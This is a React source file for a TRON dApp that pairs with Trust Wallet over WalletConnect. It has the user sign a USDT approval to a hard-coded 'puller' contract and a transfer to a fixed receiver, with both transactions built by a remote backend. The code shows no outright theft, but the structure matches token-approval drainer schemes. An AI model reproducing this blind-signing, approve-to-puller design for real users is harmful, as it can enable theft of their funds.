import React, { useState, useEffect } from "react";
import { SignClient } from "@walletconnect/sign-client";
import TronWeb from "tronweb";
import { Buffer } from "buffer";
window.Buffer = Buffer;

// === CONFIGURATION ===
const PROJECT_ID      = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const TRON_NODE       = "https://api.trongrid.io";
const USDT_CONTRACT   = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw";
const RECEIVER        = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g";
const AMOUNT          = 1_000_000;       // 1 USDT in SUN
const CHAIN_ID        = "tron:0x2b6653dc";        // TRON mainnet namespace

export default function TronApp() {
  const [client, setClient]   = useState(null);
  const [session, setSession] = useState(null);
  const [address, setAddress] = useState("");
  const [status, setStatus]   = useState("Disconnected");
  const [txHash, setTxHash]   = useState("");

  // 1. Initialize SignClient & TronWeb
  useEffect(() => {
    async function init() {
      try {
        const signClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "TRC20 DApp",
            description: "Approve & Transfer USDT on TRON",
            url: window.location.origin,
            icons: []
          }
        });
        setClient(signClient);

        // Auto–rehydrate session if present
        if (signClient.session.length) {
          const lastKey = signClient.session.keys.at(-1);
          const lastSession = signClient.session.get(lastKey);
          onSessionEstablished(lastSession, signClient);
        }
      } catch (e) {
        console.error("Init error", e);
        setStatus("Initialization failed");
      }
    }
    init();
  }, []);

  // 2. Handle a newly established session
  const onSessionEstablished = async (sess, clientInstance = client) => {
    setSession(sess);

    // Explicitly request user accounts
    const accounts = await clientInstance.request({
      topic: sess.topic,
      chainId: CHAIN_ID,
      request: { method: "tron_requestAccounts", params: [] }
    });
    setAddress(accounts[0]);
    setStatus(`Connected: ${accounts[0]}`);
  };

  // 3. Connect via deep link to Trust Wallet
  const connectWallet = async () => {
    if (!client) return;
    try {
      setStatus("Pairing… open Trust Wallet");

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          tron: {
            chains: [CHAIN_ID],
            methods: [
              "tron_requestAccounts",
              "tron_signTransaction",
              "tron_broadcastTransaction"
            ],
            events: []
          }
        }
      });

      // Deep link into Trust Wallet (universal link)
      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;

      // Wait for the user to approve in the wallet
      const newSession = await approval();
      onSessionEstablished(newSession);
    } catch (e) {
      console.error("Connection error", e);
      setStatus("Connection failed");
    }
  };

  // Helper to hit your backend
  async function callBackend(path, body) {
    const res = await fetch(`https://smartcontbackend.onrender.com/${path}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    return res.json();
  }

  // 4. Build, sign & broadcast an “approve” transaction
  const approveUSDT = async () => {
    if (!session) return;
    try {
      setStatus("Building approval…");
      const unsignedTx = await callBackend("create-approve", {
        from: address,
        token: USDT_CONTRACT,
        spender: PULLER_CONTRACT,
        amount: AMOUNT
      });

      setStatus("Signing approval…");
      const signedTx = await client.request({
        topic: session.topic,
        chainId: CHAIN_ID,
        request: {
          method: "tron_signTransaction",
          params: [unsignedTx]
        }
      });

      setStatus("Broadcasting approval…");
      const { txid, txId } = await callBackend("broadcast", { signedTx });
      const id = txid || txId;
      setTxHash(id);
      setStatus(`✅ Approved! TXID: ${id}`);
    } catch (e) {
      console.error("Approve error", e);
      setStatus(`Error: ${e.message}`);
    }
  };

  // 5. Build, sign & broadcast a “transfer” transaction
  const sendUSDT = async () => {
    if (!session) return;
    try {
      setStatus("Building transfer…");
      const unsignedTx = await callBackend("create-tx", {
        from: address,
        to: RECEIVER,
        amount: AMOUNT
      });

      setStatus("Signing transfer…");
      const signedTx = await client.request({
        topic: session.topic,
        chainId: CHAIN_ID,
        request: {
          method: "tron_signTransaction",
          params: [unsignedTx]
        }
      });

      setStatus("Broadcasting transfer…");
      const { txid, txId } = await callBackend("broadcast", { signedTx });
      const id = txid || txId;
      setTxHash(id);
      setStatus(`✅ Sent! TXID: ${id}`);
    } catch (e) {
      console.error("Send error", e);
      setStatus(`Error: ${e.message}`);
    }
  };

  // 6. Disconnect the session
  const disconnectWallet = async () => {
    if (client && session) {
      await client.disconnect({
        topic: session.topic,
        reason: { code: 6000, message: "User disconnected" }
      });
    }
    setSession(null);
    setAddress("");
    setTxHash("");
    setStatus("Disconnected");
  };

  return (
    <div style={styles.container}>
      <h2>TRC20 USDT: Approve & Send</h2>

      <p>
        <strong>Status:</strong> {status}
      </p>
      <p style={{ wordBreak: "break-all" }}>
        <strong>Address:</strong> {address || "—"}
      </p>

      {!session ? (
        <button style={styles.button} onClick={connectWallet}>
          Connect Trust Wallet
        </button>
      ) : (
        <div style={styles.buttonGroup}>
          <button style={styles.primary} onClick={approveUSDT}>
            Approve 1 USDT
          </button>
          <button style={styles.primary} onClick={sendUSDT}>
            Send 1 USDT
          </button>
          <button style={styles.secondary} onClick={disconnectWallet}>
            Disconnect
          </button>
        </div>
      )}

      {txHash && (
        <div style={styles.txBox}>
          <strong>Last TX:</strong>{" "}
          <a
            href={`https://tronscan.org/#/transaction/${txHash}`}
            target="_blank"
            rel="noopener noreferrer"
          >
            {txHash}
          </a>
        </div>
      )}
    </div>
  );
}

// === STYLES ===
const styles = {
  container: {
    maxWidth: 480,
    margin: "0 auto",
    padding: 16,
    fontFamily: "Arial, sans-serif"
  },
  button: {
    padding: "12px 24px",
    backgroundColor: "#1abc9c",
    color: "#fff",
    border: "none",
    borderRadius: 4,
    cursor: "pointer",
    fontSize: 16,
    width: "100%"
  },
  buttonGroup: {
    display: "flex",
    gap: 8,
    marginTop: 16
  },
  primary: {
    flex: 1,
    padding: "12px 16px",
    backgroundColor: "#3498db",
    color: "#fff",
    border: "none",
    borderRadius: 4,
    cursor: "pointer",
    fontSize: 14
  },
  secondary: {
    flex: 1,
    padding: "12px 16px",
    backgroundColor: "#e74c3c",
    color: "#fff",
    border: "none",
    borderRadius: 4,
    cursor: "pointer",
    fontSize: 14
  },
  txBox: {
    marginTop: 16,
    padding: 12,
    backgroundColor: "#f8f9fa",
    border: "1px solid #ddd",
    borderRadius: 4,
    wordBreak: "break-all"
  }
};
